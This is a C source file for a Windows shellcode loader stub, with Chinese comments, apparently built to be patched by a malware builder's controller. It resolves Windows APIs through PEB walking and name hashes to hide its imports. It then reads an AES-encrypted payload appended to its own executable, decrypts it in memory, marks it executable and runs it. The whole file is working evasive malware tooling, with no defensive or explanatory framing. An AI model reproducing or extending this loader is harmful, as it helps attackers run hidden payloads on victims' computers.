#include <windows.h>
#include <stdint.h>
#include "aes_mini.h"

// 注入数据结构 (必须与主控端 BuilderDialog.cpp 中的填充逻辑严格一致)
typedef struct _SCInfo {
    unsigned char aes_key[16];
    unsigned char aes_iv[16];
    unsigned char* data;      // 在加载器中此字段无效，仅用于对齐结构
    int len;                  // 加密数据的长度
    int offset;               // 加密数据在文件中的偏移
    char file[MAX_PATH];
    char targetDir[MAX_PATH];
    char downloadUrl[MAX_PATH];
} SCInfo;

// API Hash 定义
#define Kernel32Lib_Hash    0x1cca9ce6
#define GetProcAddress_Hash 0x1AB9B854
#define LoadLibraryA_Hash   0x7F201F78
#define VirtualAlloc_Hash   0x5E893462
#define VirtualProtect_Hash 1819198468
#define Sleep_Hash          1065713747
#define GetModuleFileName_Hash 1888753264
#define CreateFileA_Hash    1470354217
#define SetFilePointer_Hash 1978850691
#define ReadFile_Hash       990362902
#define CloseHandle_Hash    110641196

// 函数指针类型
typedef void* (WINAPI* _GetProcAddress)(HMODULE hModule, char* funcName);
typedef HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
typedef LPVOID(WINAPI* _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* _VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef VOID(WINAPI* _Sleep)(DWORD dwMilliseconds);
typedef DWORD(WINAPI* _GetModuleFileName)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
typedef BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
typedef BOOL(WINAPI* _CloseHandle)(HANDLE hObject);

// -------------------------------------------------------------------------
// 辅助函数
// -------------------------------------------------------------------------
inline uint32_t calc_hash(const char* str) {
    uint32_t seed = 131;
    uint32_t hash = 0;
    while (*str) { hash = hash * seed + (*str++); }
    return (hash & 0x7FFFFFFF);
}

inline uint32_t calc_hashW(const wchar_t* str, int len) {
    uint32_t seed = 131;
    uint32_t hash = 0;
    for (int i = 0; i < len; ++i) {
        wchar_t s = *str++;
        if (s >= 'a') s = s - 0x20;
        hash = hash * seed + s;
    }
    return (hash & 0x7FFFFFFF);
}

// -------------------------------------------------------------------------
// PEB 解析
// -------------------------------------------------------------------------
typedef struct _UNICODE_STR { USHORT Length; USHORT MaximumLength; PWSTR pBuffer; } UNICODE_STR;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STR FullDllName; UNICODE_STR BaseDllName; } LDR_DATA_TABLE_ENTRY;
typedef struct _PEB_LDR_DATA { DWORD dwLength; DWORD dwInitialized; LPVOID lpSsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA;
typedef struct _PEB { BYTE bInheritedAddressSpace; BYTE bReadImageFileExecOptions; BYTE bBeingDebugged; BYTE bSpareBool; LPVOID lpMutant; LPVOID lpImageBaseAddress; PEB_LDR_DATA* pLdr; } PEB;

inline HMODULE get_kernel32_base() {
    PEB* peb = NULL;
#ifdef _WIN64
    peb = (PEB*)__readgsqword(0x60);
#else
    peb = (PEB*)__readfsdword(0x30);
#endif
    LIST_ENTRY* entry = peb->pLdr->InMemoryOrderModuleList.Flink;
    while (entry) {
        LDR_DATA_TABLE_ENTRY* e = (LDR_DATA_TABLE_ENTRY*)((BYTE*)entry - sizeof(LIST_ENTRY));
        if (calc_hashW(e->BaseDllName.pBuffer, e->BaseDllName.Length / 2) == Kernel32Lib_Hash) {
            return (HMODULE)e->DllBase;
        }
        entry = entry->Flink;
    }
    return 0;
}

void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash) {
    PIMAGE_DOS_HEADER dosh = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((BYTE*)module + dosh->e_lfanew);
    PIMAGE_DATA_DIRECTORY dataDict = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dataDict->VirtualAddress == 0) return 0;
    PIMAGE_EXPORT_DIRECTORY exportDict = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + dataDict->VirtualAddress);
    uint32_t* fn = (uint32_t*)((BYTE*)module + exportDict->AddressOfNames);
    uint32_t* fa = (uint32_t*)((BYTE*)module + exportDict->AddressOfFunctions);
    uint16_t* ord = (uint16_t*)((BYTE*)module + exportDict->AddressOfNameOrdinals);
    for (uint32_t i = 0; i < exportDict->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)module + fn[i]);
        if (calc_hash(name) == func_hash) {
            return (BYTE*)module + fa[ord[i]];
        }
    }
    return 0;
}

// -------------------------------------------------------------------------
// 注入数据 (位于 Data 段，主控端会定位 "FormidableStub" 并覆盖此结构)
// -------------------------------------------------------------------------
#pragma data_seg(".config")
SCInfo g_SCInfo = { "FormidableStub" };
#pragma data_seg()
#pragma comment(linker, "/SECTION:.config,ERW")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HMODULE kernel32 = get_kernel32_base();
    if (!kernel32) return 1;

    _VirtualAlloc pVirtualAlloc = (_VirtualAlloc)get_proc_address_from_hash(kernel32, VirtualAlloc_Hash);
    _VirtualProtect pVirtualProtect = (_VirtualProtect)get_proc_address_from_hash(kernel32, VirtualProtect_Hash);
    _GetModuleFileName pGetModuleFileName = (_GetModuleFileName)get_proc_address_from_hash(kernel32, GetModuleFileName_Hash);
    _CreateFileA pCreateFileA = (_CreateFileA)get_proc_address_from_hash(kernel32, CreateFileA_Hash);
    _SetFilePointer pSetFilePointer = (_SetFilePointer)get_proc_address_from_hash(kernel32, SetFilePointer_Hash);
    _ReadFile pReadFile = (_ReadFile)get_proc_address_from_hash(kernel32, ReadFile_Hash);
    _CloseHandle pCloseHandle = (_CloseHandle)get_proc_address_from_hash(kernel32, CloseHandle_Hash);
    _Sleep pSleep = (_Sleep)get_proc_address_from_hash(kernel32, Sleep_Hash);

    char szPath[MAX_PATH];
    pGetModuleFileName(NULL, szPath, MAX_PATH);

    HANDLE hFile = pCreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 2;

    pSetFilePointer(hFile, g_SCInfo.offset, NULL, FILE_BEGIN);

    LPVOID pData = pVirtualAlloc(NULL, g_SCInfo.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pData) { pCloseHandle(hFile); return 3; }

    DWORD dwRead = 0;
    if (!pReadFile(hFile, pData, g_SCInfo.len, &dwRead, NULL)) { pCloseHandle(hFile); return 4; }
    pCloseHandle(hFile);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, g_SCInfo.aes_key, g_SCInfo.aes_iv);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t*)pData, g_SCInfo.len);

    DWORD dwOldProtect;
    pVirtualProtect(pData, g_SCInfo.len, PAGE_EXECUTE_READ, &dwOldProtect);

    // 执行 Shellcode
    ((void(*)())pData)();

    pSleep(INFINITE);
    return 0;
}
